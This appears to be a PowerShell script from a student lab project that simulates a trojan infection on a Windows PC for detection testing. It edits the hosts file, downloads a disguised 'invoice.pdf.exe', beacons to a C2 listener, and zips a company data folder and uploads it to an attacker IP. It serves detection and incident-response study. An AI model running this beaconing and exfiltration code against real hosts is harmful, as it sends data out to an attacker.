<#
================================================================
Employee PC - Insider-Introduced Malware: Data Theft via
Trojanized Download Simulation
Scenario 3 (Apex Manufacturing FYP) - Revised Scope
================================================================
Narrative:
  An employee is convinced by a malicious website to download a file
  that turns out to be a trojan. The malware executes locally,
  establishes a C2 channel, discovers valuable local company data,
  and exfiltrates it to the attacker. There is no encryption/impact
  stage - this scenario models data theft, not ransomware.

  This version is scoped to a SINGLE-HOST early-stage infection -
  no lateral movement, no SMB enumeration, no propagation. This
  matches real-world initial-access-and-theft incidents, before any
  spread across the network and without an extortion/impact phase.

Attack flow simulated:
  0. Simulated DNS resolution of untrusted external domain   (MITRE T1583.001 - Acquire Infrastructure: Domains)
  1. Malicious file download from fake website                (MITRE T1204.002 - User Execution: Malicious File)
  2. Malware execution (simulated process spawn)               (MITRE T1204.002 / T1059 - Command and Scripting Interpreter)
  3. C2 communication (beaconing)                               (MITRE T1071 - Application Layer Protocol)
  4. Local data discovery                                       (MITRE T1083 - File and Directory Discovery)
  5. Data exfiltration                                          (MITRE T1005 - Data from Local System, T1041 - Exfil over C2 Channel)

SAFETY:
  - Only READS from C:\Company Data (never modifies or deletes it).
  - All zipped/exfiltrated copies are written to a local scratch
    folder ($TestFolder) and then uploaded to your own C2 listener.
  - No real exploit code, no persistence, no destructive action.
  - Run ONLY inside your isolated lab environment.

BEFORE RUNNING:
  - Start attacker_c2_listener.py on the Attacker VM first.
  - Fill in the variables below.
  - Ensure your Suricata sensor is capturing traffic on this segment.
  - Run PowerShell as Administrator (needed for the hosts file edit in Stage 0).
================================================================
#>

# ---------------- CONFIG - EDIT THESE ----------------
$AttackerIP         = "192.168.50.248"                # Attacker VM IP (ideally on a separate/external-facing subnet)
$AttackerPort       = 8080
$FakeExternalDomain = "free-invoice-tools.com"      # Fake external-looking domain for the download stage
$TestFolder         = "$env:TEMP\ir_sim"            # Local scratch folder for this simulation only
$CompanyDataPath    = "C:\Company Data"             # Your existing dummy data folder - READ ONLY, never modified
$BeaconCount        = 5                           # Number of C2 beacon check-ins
$BeaconInterval     = 2                            # Seconds between beacons
# ------------------------------------------------------

New-Item -ItemType Directory -Path $TestFolder -Force | Out-Null
Write-Host "=== Insider-Introduced Malware: Data Theft Simulation Starting ===" -ForegroundColor Cyan

# ---------------------------------------------------------------
# STAGE 0: Simulate DNS resolution of an "untrusted external" domain
# ---------------------------------------------------------------
Write-Host "`n[Stage 0] Simulating DNS resolution for '$FakeExternalDomain'..." -ForegroundColor Yellow
$HostsFile = "$env:WINDIR\System32\drivers\etc\hosts"
$HostsEntry = "$AttackerIP`t$FakeExternalDomain"
try {
    $existing = Get-Content $HostsFile -ErrorAction Stop
    if ($existing -notcontains $HostsEntry) {
        Add-Content -Path $HostsFile -Value "`n$HostsEntry" -ErrorAction Stop
        Write-Host "  Added hosts entry: $HostsEntry"
    } else {
        Write-Host "  Hosts entry already present."
    }
    Resolve-DnsName -Name $FakeExternalDomain -ErrorAction SilentlyContinue | Out-Null
} catch {
    Write-Warning "  Could not edit hosts file (run PowerShell as Administrator). Falling back to raw IP for download. $_"
    $FakeExternalDomain = $AttackerIP
}

# ---------------------------------------------------------------
# STAGE 1: Malicious file download (delivery via fake website)
# ---------------------------------------------------------------
Write-Host "`n[Stage 1] Downloading malicious file from fake website ($FakeExternalDomain)..." -ForegroundColor Yellow
$PayloadPath = Join-Path $TestFolder "invoice.pdf.exe"
try {
    Invoke-WebRequest -Uri "http://$FakeExternalDomain`:$AttackerPort/payload" `
        -OutFile $PayloadPath -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0"
    Write-Host "  Downloaded malicious file to $PayloadPath"
} catch {
    Write-Warning "  Download failed - check the C2 listener is running. $_"
}
Start-Sleep -Seconds 2

# ---------------------------------------------------------------
# STAGE 2: Malware execution (simulated)
# ---------------------------------------------------------------
Write-Host "`n[Stage 2] Simulating malware execution..." -ForegroundColor Yellow
# We do NOT execute the downloaded file (it's inert placeholder text).
# Instead, spawn a benign process to generate a process-creation event
# in your Sysmon/host logs, representing "malware execution" for
# correlation purposes in your dashboard.
try {
    Start-Process -FilePath "cmd.exe" -ArgumentList "/c echo Simulated malware execution marker" -WindowStyle Hidden
    Write-Host "  Simulated execution event generated (check Sysmon Event ID 1 for this process)"
} catch {
    Write-Warning "  Could not spawn simulated execution process: $_"
}
Start-Sleep -Seconds 2

# ---------------------------------------------------------------
# STAGE 3: C2 communication (beaconing)
# ---------------------------------------------------------------
Write-Host "`n[Stage 3] Starting C2 beaconing ($BeaconCount check-ins, every $BeaconInterval s)..." -ForegroundColor Yellow
for ($i = 1; $i -le $BeaconCount; $i++) {
    try {
        Invoke-WebRequest -Uri "http://$AttackerIP`:$AttackerPort/beacon?id=$env:COMPUTERNAME&seq=$i" `
            -UseBasicParsing -UserAgent "WindowsPowerShell/5.1" | Out-Null
        Write-Host "  Beacon $i/$BeaconCount sent"
    } catch {
        Write-Warning "  Beacon $i failed: $_"
    }
    Start-Sleep -Seconds $BeaconInterval
}

# ---------------------------------------------------------------
# STAGE 4: Local data discovery
# ---------------------------------------------------------------
Write-Host "`n[Stage 4] Discovering local company data..." -ForegroundColor Yellow
$DiscoveryLog = Join-Path $TestFolder "discovered_files.txt"
try {
    $files = Get-ChildItem -Path $CompanyDataPath -Recurse -File -ErrorAction Stop
    $files | Select-Object FullName, Length, LastWriteTime | Out-File -FilePath $DiscoveryLog
    Write-Host "  Discovered $($files.Count) files under $CompanyDataPath (logged to $DiscoveryLog)"
} catch {
    Write-Warning "  Data discovery failed - check that $CompanyDataPath exists: $_"
}

# ---------------------------------------------------------------
# STAGE 5: Data exfiltration (reads and uploads a COPY only)
# ---------------------------------------------------------------
Write-Host "`n[Stage 5] Simulating data exfiltration from Company Data..." -ForegroundColor Yellow
$ExfilZip = Join-Path $TestFolder "exfil_package.zip"
try {
    Compress-Archive -Path "$CompanyDataPath\*" -DestinationPath $ExfilZip -Force -ErrorAction Stop
    Write-Host "  Compressed a copy of Company Data (originals untouched)"

    Invoke-WebRequest -Uri "http://$AttackerIP`:$AttackerPort/exfil" `
        -Method POST -InFile $ExfilZip -ContentType "application/zip" -UseBasicParsing | Out-Null
    Write-Host "  Exfil package sent to attacker C2"
} catch {
    Write-Warning "  Exfiltration step failed: $_"
}

Write-Host "`n=== Data theft simulation complete (Stages 0-5). No encryption/impact stage in this scenario. ===" -ForegroundColor Cyan

# ---------------------------------------------------------------
# CLEANUP (optional - run separately after you've captured your evidence)
# ---------------------------------------------------------------
# Remove-Item -Path $TestFolder -Recurse -Force
#
# To remove the hosts file entry added in Stage 0:
# (Get-Content $HostsFile) | Where-Object { $_ -notmatch $FakeExternalDomain } | Set-Content $HostsFile
